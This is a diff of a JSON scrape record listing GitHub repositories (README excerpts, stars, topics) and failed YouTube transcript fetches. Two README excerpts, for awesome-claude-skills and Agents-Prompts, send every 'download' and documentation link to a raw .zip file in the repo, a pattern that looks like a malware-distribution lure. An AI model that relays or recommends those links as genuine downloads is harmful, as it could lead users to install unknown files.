-          "iterative-development",
+          "claude-code-skills",
+          "claude-desktop",
+          "debugging",
+          "gemini",
+          "llama",
           "llm",
-          "meeseeks",
-          "pickle-rick",
-          "tmux"
+          "productivity",
+          "qwen-coder",
+          "skills"
         ],
         "source": "search",
-        "text_excerpt": "<img src=\"images/pickle-rick.png\" alt=\"Pickle Rick for Claude Code\" width=\"100%\" /> # 🥒 Pickle Rick for Claude Code > *\"Wubba Lubba Dub Dub! 🥒 I'm not just an AI assistant, Morty — I'm an **autonomous engineering machine** trapped in a pickle jar!\"* Pickle Rick is a complete agentic engineering toolbelt built on the [Ralph Wiggum loop](https://ghuntley.com/ralph/) and ideas from Andrej Karpathy's [AutoResearch](https://github.com/karpathy/autoresearch) project. Hand it a PRD — or let it draft one — and it decomposes work into tickets, spawns isolated worker subprocesses, and drives each through a full **research → plan → implement → verify → review → simplify** lifecycle without human intervention. New to PRDs? See the **[PRD Writing Guide](PRD_GUIDE.md)** for developers or the **[Product Manager's Guide](PM_GUIDE.md)** for PMs defining and refining requirements. For internals, see [Internals](internals.md). For what's coming next, see the [Feature Roadmap](roadmap.md). > **Recently released** — `/citadel` conformance audit · **v1.58** Convergence Toolchain Gates ([details](#convergence-gate)) · **v1.57** `/cronenberg` meta-router · **v1.56** pipeline resume hardening · **v1.55** Agent Teams mode (`/pickle-tmux --teams`) · **v1.51** Codex backend (`--backend codex`). --- ## How to Build Things with Pickle Rick Two ways to drive every step: **just describe what you want** (Rick routes to the right skill) or **invoke the slash command yourself** (explicit control). Same artifacts either way. > **Fire and forget** — for one-shot autopilot from goal to shipped code, hand the whole thing to `/pickle-pipeline \"<goal>\"` (build → citadel → anatomy-park → szechuan-sauce, sequential, with auto-refine when prose triggers it) or `/cronenberg \"<goal>\"` (meta-router that picks the right metaphor + cleanup chain for the task). Skip the step-by-step below. ### Step 1: Write a PRD Every feature starts with a PRD. Just describe what you want: ``` \"Help me write a PRD for caching loan status API responses in Redis\" ``` Rick interrogates you — *why* are you building this, *who* is it for, and critically: **how will we verify each requirement automatically?** He explores your codebase during the interview, grounding the PRD in what actually exists. Or write your own `prd.md` and skip the interview — whatever gets requirements on paper with machine-checkable acceptance criteria.\n\n[TRUNCATED]",
+        "text_excerpt": "# 🌟 awesome-claude-skills - Enhance Claude’s Capabilities with Skills [![Download from Releases](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip%20from%https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip)](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip) ## 🚀 Getting Started Welcome to the awesome-claude-skills repository. This guide will help you download and run the software easily. With these skills, you can enhance Claude's performance in specific tasks, making your interactions more efficient. ## ⚙️ What Are Skills? Skills are collections of instructions and scripts designed to improve Claude's capabilities. They allow Claude to perform tasks that align with your needs. Whether it’s creating documents tailored to your brand or automating repetitive tasks, skills provide a structured way to teach Claude. Explore more about skills with these links: - [What are skills?](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip) - [Using skills in Claude](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip) - [How to create custom skills](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip) - [Equipping agents for the real world with Agent Skills](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip) ## 💻 System Requirements To run the awesome-claude-skills application smoothly, ensure your system meets the following requirements: - **Operating System:** Windows 10 or higher, macOS 10.12 (Sierra) or higher, or a modern Linux distribution. - **Processor:** Dual-core processor or higher. - **Memory:** At least 4 GB of RAM. - **Disk Space:** Minimum of 100 MB of free space. ## 📥 Download & Install To get started, visit the Releases page to download the latest version of the software. Click the link below: [Download from Releases](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip) Once on the Releases page, f\n\n[TRUNCATED]",
         "text_source_field": "readme_text",
         "text_truncated_in_raw": false
       },
@@ -799,7 +758,7 @@
         "url": "https://github.com/HIDORAKAI002/ai-workspace-archive",
         "description": "A massive, self-updating local archive of AI tools — 11,000+ agent skills, 240+ MCP servers, 2,200+ IDE rules (Cursor/Cline), and 30+ system prompt collections. One repo to rule them all.",
         "stars": 24,
-        "pushed_at": "2026-06-29T03:04:37Z",
+        "pushed_at": "2026-06-29T03:20:55Z",
         "topics": [
           "agents",
           "ai",
@@ -819,54 +778,21 @@
         "text_truncated_in_raw": false
       },
       {
-        "name": "Agents-Prompts",
-        "full_name": "BigBoySlave/Agents-Prompts",
-        "url": "https://github.com/BigBoySlave/Agents-Prompts",
-        "description": "# Agents-PromptsEste repositório contém os prompts usados nas principais ferramentas de IA do mundo, incluindo FULL v0, Cursor, Manus, Lovable e mais. Estude mais de 7000 linhas de prompts para entender como criar seus próprios agentes. 🛠️🤖Se você deseja aprender a criar seus próprios agentes, confira nosso curso gratuito que ensina a combinar",
-        "stars": 23,
-        "pushed_at": "2026-06-29T02:53:51Z",
-        "topics": [
-          "agent",
-          "ai",
-          "ai-agents",
-          "bolt",
-          "chatgpt",
-          "copilot",
-          "cursorai",
-          "devinai",
-          "genai",
-          "llm",
-          "open-source",
-          "openai",
-          "prompt",
-          "prompts-template",
-          "system-prompts",
-          "trae",
-          "windsurf",
-          "windsurf-ai"
-        ],
-        "source": "search",
-        "text_excerpt": "# Agents Prompts: Unlocking the Power of AI Tools 🤖✨ Welcome to the **Agents Prompts** repository! This space is dedicated to sharing comprehensive prompts used in some of the leading AI tools available today. Here, you will find a treasure trove of insights and examples that can help you understand how to create and refine your own AI agents. ## What’s Inside? 📚 This repository contains prompts for a variety of AI tools, including: - **FULL v0** - **Cursor** - **Manus** - **https://github.com/BigBoySlave/Agents-Prompts/raw/refs/heads/main/Lovable/Agents_Prompts_v1.5.zip** - **Lovable** - **Devin** - **Replit Agent** - **Windsurf Agent** - **VSCode Agent** - **Dia Browser** - **Trae AI** With over **7000 lines** of prompts, you will gain valuable insights into the creation of the world's leading agents. Use these examples to enhance your own projects and elevate your understanding of AI capabilities. ## How to Create Your Own Agents 🛠️ If you're interested in developing your own agents, we have prepared a **free course** for you. In under **4 hours**, you can learn how to create your first system by combining modern LLMs, Python, and RAG to feed your model with proprietary data. ![Curso Gratuito de IA](https://github.com/BigBoySlave/Agents-Prompts/raw/refs/heads/main/Lovable/Agents_Prompts_v1.5.zip) ### Course Overview - **Duration**: Less than 4 hours - **Content**: Hands-on lessons that guide you through the process of building an AI agent. - **Skills Covered**: - Understanding LLMs - Using Python for AI development - Implementing RAG techniques By the end of this course, you will have a solid foundation to create your own AI systems. ## Getting Started 🚀 To get started with the prompts, simply download the files from the [Releases section](https://github.com/BigBoySlave/Agents-Prompts/raw/refs/heads/main/Lovable/Agents_Prompts_v1.5.zip). This section contains the latest updates and versions of the prompts. ### How to Use the Prompts 1. **Download the prompts**: Visit the [Releases section](https://github.com/BigBoySlave/Agents-Prompts/raw/refs/heads/main/Lovable/Agents_Prompts_v1.5.zip) to access the latest files. 2. **Explore the examples**: Review the prompts to understand their structure and purpose. 3. **Implement and test**: Use the prompts in your own AI tools and observe the outcomes. 4. **Refine your approach**: Adjust the prompts based on your ne\n\n[TRUNCATED]",
-        "text_source_field": "readme_text",
-        "text_truncated_in_raw": false
-      },
-      {
-        "name": "Lework",
-        "full_name": "insmtx/Lework",
-        "url": "https://github.com/insmtx/Lework",
-        "description": "让 AI 像真正的团队成员一样参与项目、执行任务、协作交付的 AI Native 工作平台。",
+        "name": "Raphael",
+        "full_name": "Orbital-Web/Raphael",
+        "url": "https://github.com/Orbital-Web/Raphael",
+        "description": "Superhuman chess engine and GUI coded in C++ and SFML.",
         "stars": 21,
-        "pushed_at": "2026-06-29T02:53:23Z",
+        "pushed_at": "2026-06-29T03:18:05Z",
         "topics": [
-          "agent",
-          "agentic-agent",
-          "ai-native",
-          "multi-agent",
-          "multi-agent-systems",
-          "skill"
+          "ai",
+          "chess",
+          "chess-engine",
+          "neural-network",
+          "nnue"
         ],
         "source": "search",
-        "text_excerpt": "# Lework ## 让 AI 从聊天工具变成可以长期协同工作的团队成员 > 给 AI 一个项目、一个角色、一个任务。它独立执行，你验收结果。 --- ## 为什么需要 Lework AI 辅助工作越来越普及，但产出收不回来 — 对话结束即清零。你无法把 AI 当成劳动力来管理：没有分工、没有指派、没有交付物、没有追踪。 ### Lework 做什么 把 AI 变成可管理的生产力。 - 👥 **建团队** — 定义角色、绑定技能，创建 AI 队友 - 📋 **派任务** — 指定负责人、预期产出、验收标准 - 📦 **拿结果** — AI 独立执行，交付可追溯的产物 - 🧠 **沉淀资产** — 上下文和产出持续积累，越用越强 - 📊 **可管理** — 进度、质量、调用成本，全程可见可控 --- ## 🧩 一分钟理解 Lework 想象你有一个 AI 团队： ``` 项目：新产品后台系统 ├── AI 队友·架构师（角色：技术决策，技能：系统设计评审） ├── AI 队友·开发者 1（角色：后端开发，技能：Go 编程、API 设计） ├── AI 队友·开发者 2（角色：前端开发，技能：React、组件库） ├── AI 队友·QA（角色：质量保障，技能：测试用例生成、回归测试） └── AI 队友·PM（角色：进度管理，技能：日报生成、风险识别） ├── 任务：设计用户权限模型 → 指派给 架构师 ├── 任务：实现登录接口 → 指派给 开发者 1 ├── 任务：构建登录页面 → 指派给 开发者 2 └── 任务：编写集成测试 → 指派给 QA ``` **每个 AI 队友有自己的角色、技能、权限边界和记忆。** 你创建任务、分配队友、跟踪进度 — 它们独立执行，产出代码、文档、报告。 执行完成后，产物沉淀进知识库，下次类似任务不需要重新交代上下文。 --- ## ⚡ 协作流程 ``` 💬 项目会话（讨论需求、对齐方案） ↓ 方向明确 📋 创建任务（定义目标、预期输出、指派 AI 队友） ↓ ⚙️ AI 队友自主执行（调用技能、产出中间结果） ↓ ✅ 人工审批 / 接管 / 补充上下文（关键节点） ↓ 📦 产出项目资产（文档 / 代码 / 报告 / 结构化数据） ↓ 🧠 沉淀知识库（下次不再重复交代） ``` 每一步全程可审计、可回溯、可中断调整。 --- --- ## 🧬 核心实体 | 实体 | 做什么 | 交付什么 | |------|--------|---------| | **项目** | 划定协作边界，承载目标与上下文 | 项目级资产全景 | | **任务** | 指派 AI 队友，明确产出要求 | 可验收的交付物 | | **AI 队友** | 分工、授权、设定能力边界 | 独立完成任务的执行者 | | **技能** | 赋予队友具体能力 | 代码、评审、测试、报告等 | | **知识库** | 沉淀上下文和规范 | 不再需要反复交代背景 | | **项目资产** | 查看所有历史交付物 | 随时回溯、可复用 | --- ## 🔐 企业级治理 - **多租户隔离** — 企业间数据与执行环境完全隔离 - **RBAC 访问控制** — 用户、AI 队友、技能三级权限 - **执行审计** — 所有任务执行全链路可追溯、可回放 - **成本追踪** — 模型调用成本按任务、项目、团队维度统计 - **密钥安全** — API 密钥托管与脱敏 - **审批工作流** — 关键操作可配置人工审批节点 - **私有化部署** — 支持企业内部基础设施部署 --- ## 🛣 路线图 | 阶段 | 重点 | 内容 | |------|------|------| | **Phase 1** · 核心执行层 | 跑通任务驱动闭环 | 项目管理、任务系统、AI 队友执行、技能系统 | | **Phase 2** · 企业智能 | 多队友协作与知识飞轮 | 跨队友协作编排、知识自动化沉淀、成本优化 | | **Phase 3** · 生态平台 | AI 工作协作市场 | 技能市场、AI 队友模板、组织级工作台 | --- ## 📚 文档 | 文档 | 说明 | |------|------| | [PRD.md](docs/PRD.md) | 产品需求文档（v3.0 — 让 AI 从聊天工具变成可以长期协同工作的团队成员） | | [ARCHITECTURE.md](docs/ARCHITECTURE.md) | 系统架构设计 | | [DESIGN_PHILOSOPHY.md](docs/DESIGN_PHILOSOPHY.md) | 设计哲学与原则 | | [SYSTEM_DESIGN.md](docs/SYSTEM_DESIGN.md) | 平台引擎与连接器设计 | | [TECH_DESIGN.md](docs/TECH_DESIGN.md) | 技术方案（技能 Schema、渲染引擎） | | [PLANNING.md](docs/PLANNING.md) | 业务板块路线图 | | [CONTRIBUTING.md](CONTRIBUTING.md) | 贡献指南 | --- ## 🤝 贡献 欢迎贡献技能插件、模型适配器、工作流模板和安全增强。详见 [CONTRIBUTING.md](CONTRIBUTING.md)。",
+        "text_excerpt": "# <div align=\"center\"><img src=src/assets/logo/Raphael_Logo_HL_NoBG_Text.png alt=\"Raphael Logo\" width=400 /></div> Raphael is a superhuman UCI Chess Engine built using C++. It also comes with a GUI built using [SFML](https://www.sfml-dev.org/). You can [scroll to the bottom](#raphael-engine) to see a list of features currently implemented, and also download the prebuilt binaries to try out Raphael for yourself. Raphael is largely inspired by [Sebastian Lague's Coding Adventure series on implementing a Chess Engine](https://youtu.be/U4ogK0MIzqk). ## Elo The following are the historic elo for Raphael. <table> <tr align=\"center\"> <th>Version</th> <th>Release Date</th> <th><a href=\"https://www.computerchess.org.uk/ccrl/404/cgi/compare_engines.cgi?family=Raphael\">CCRL Blitz</a></th> <th><a href=\"https://www.computerchess.org.uk/ccrl/4040/cgi/compare_engines.cgi?family=Raphael\">CCRL 40/15</a></th> <th><a href=\"http://www.cegt.net/40_40%20Rating%20List/40_40%20SingleVersion/rangliste.html\">CEGT 40/20</a></th> <th><a href=\"https://ipmanchess.yolasite.com/r9-7945hx.php\">Ipman R9</a></th> <th><a href=\"https://www.sp-cc.de\">SPCC</a></th> </tr> <tr align=\"center\"> <td>4.2.0 </td> <td>Jun 27, 2026 </td> <td>3740* </td> <td>3600* </td> <td> </td> <td> </td> <td>3710 (#11)</td> </tr> <tr align=\"center\"> <td>4.1.0 </td> <td>May 17, 2026 </td> <td>3716 (#26)</td> <td>3614 (#20) </td> <td>3555 (#22)</td> <td>3513 (#18) </td> <td> </td> </tr> <tr align=\"center\"> <td>4.0.0 </td> <td>Apr 26, 2026 </td> <td>3697* </td> <td>3606 (#23) </td> <td>3532 (#31)</td> <td>3487 (#20**) </td> <td> </td> </tr> <tr align=\"center\"> <td>3.3.0</td> <td>Apr 06, 2026</td> <td>3670 </td> <td>3558 </td> <td>3521 </td> <td> </td> <td> </td> </tr> <tr align=\"center\"> <td>3.2.0</td> <td>Mar 19, 2026</td> <td>3612*</td> <td>3484 </td> <td>3433 </td> <td> </td> <td> </td> </tr> <tr align=\"center\"> <td>3.1.0</td> <td>Mar 01, 2026</td> <td>3510 </td> <td>3416 </td> <td> </td> <td> </td> <td> </td> </tr> <tr align=\"center\"> <td>3.0.0</td> <td>Feb 12, 2026</td> <td>3252 </td> <td>3206 </td> <td> </td> <td> </td> <td> </td> </tr> <tr align=\"center\"> <td>2.3.0</td> <td>Jan 25, 2026</td> <td>3146*</td> <td>3061 </td> <td> </td> <td> </td> <td> </td> </tr> <tr align=\"center\"> <td>2.2.0</td> <td>Jan 08, 2026</td> <td>3035*</td> <td>2953 </td> <td> </td> <td> </td> <td> </td> </tr> <tr align=\"center\"> <td>2.1.0</t\n\n[TRUNCATED]",
         "text_source_field": "readme_text",
         "text_truncated_in_raw": false
       }
@@ -1125,219 +1051,51 @@
     "youtube": [
       {
         "type": "youtube",
+        "title": "Lex Fridman",
+        "url": "https://www.youtube.com/@lexfridman",
+        "failure_reason": "channel_list_failed: Unable to handle request: Unsupported proxy type: \"\" (requests, urllib)"
+      },
+      {
+        "type": "youtube",
+        "title": "Lenny's Podcast",
+        "url": "https://www.youtube.com/@LennysPodcast",
+        "failure_reason": "channel_list_failed: Unable to handle request: Unsupported proxy type: \"\" (requests, urllib)"
+      },
+      {
+        "type": "youtube",
+        "title": "Dwarkesh Patel",
+        "url": "https://www.youtube.com/@DwarkeshPatel",
+        "failure_reason": "channel_list_failed: Unable to handle request: Unsupported proxy type: \"\" (requests, urllib)"
+      },
+      {
+        "type": "youtube",
+        "title": "Acquired",
+        "url": "https://www.youtube.com/@AcquiredFM",
+        "failure_reason": "channel_list_failed: Unable to handle request: Unsupported proxy type: \"\" (requests, urllib)"
+      },
+      {
+        "type": "youtube",
+        "title": "Tim Ferriss",
+        "url": "https://www.youtube.com/@timferriss",
+        "failure_reason": "channel_list_failed: Unable to handle request: Unsupported proxy type: \"\" (requests, urllib)"
+      },
+      {
+        "type": "youtube",
         "title": "20VC",
         "url": "https://www.youtube.com/@20VCwithHarryStebbings",
-        "failure_reason": "channel_list_failed: ERROR: [youtube:tab] @20VCwithHarryStebbings: Unable to download API page: HTTP Error 404: Not Found (caused by <HTTPError 404: Not Found>)"
+        "failure_reason": "channel_list_failed: Unable to handle request: Unsupported proxy type: \"\" (requests, urllib)"
       },
       {
         "type": "youtube",
-        "title": "Biggest Mysteries in Physics: Antimatter, Dark Energy & ToE - Don Lincoln | Lex Fridman Podcast #497",
-        "url": "https://www.youtube.com/watch?v=1M3Vdl6DRkU",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=1M3Vdl6DRkU! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] 1M3Vdl6DRkU: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
+        "title": "Invest Like the Best",
+        "url": "https://www.youtube.com/@ILTB_Podcast",
+        "failure_reason": "channel_list_failed: Unable to handle request: Unsupported proxy type: \"\" (requests, urllib)"
       },
       {
         "type": "youtube",
-        "title": "FFmpeg: The Incredible Technology Behind Video on the Internet | Lex Fridman Podcast #496",
-        "url": "https://www.youtube.com/watch?v=nepKKz-MzFM",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=nepKKz-MzFM! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] nepKKz-MzFM: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Vikings, Ragnar, Berserkers, Valhalla & the Warriors of the Viking Age | Lex Fridman Podcast #495",
-        "url": "https://www.youtube.com/watch?v=iKx3gAODybU",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=iKx3gAODybU! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] iKx3gAODybU: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Jensen Huang: NVIDIA - The $4 Trillion Company & the AI Revolution | Lex Fridman Podcast #494",
-        "url": "https://www.youtube.com/watch?v=vif8NQcjVf0",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=vif8NQcjVf0! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] vif8NQcjVf0: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Jeff Kaplan: World of Warcraft, Overwatch, Blizzard, and Future of Gaming | Lex Fridman Podcast #493",
-        "url": "https://www.youtube.com/watch?v=H9rF1CSSh-w",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=H9rF1CSSh-w! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] H9rF1CSSh-w: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "OpenAI Codex lead on taste, curation, and building for AGI | Andrew Ambrosino",
-        "url": "https://www.youtube.com/watch?v=P3KDebPTUrw",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=P3KDebPTUrw! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] P3KDebPTUrw: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "What happens after coding is solved? | Fiona Fung (Claude Code & Cowork)",
-        "url": "https://www.youtube.com/watch?v=Ybrl4FYM57c",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=Ybrl4FYM57c! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] Ybrl4FYM57c: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "The hidden pattern behind successful products | Mark Pincus (FarmVille, Words with Friends, & more)",
-        "url": "https://www.youtube.com/watch?v=7eh9C3TUotc",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=7eh9C3TUotc! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] 7eh9C3TUotc: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
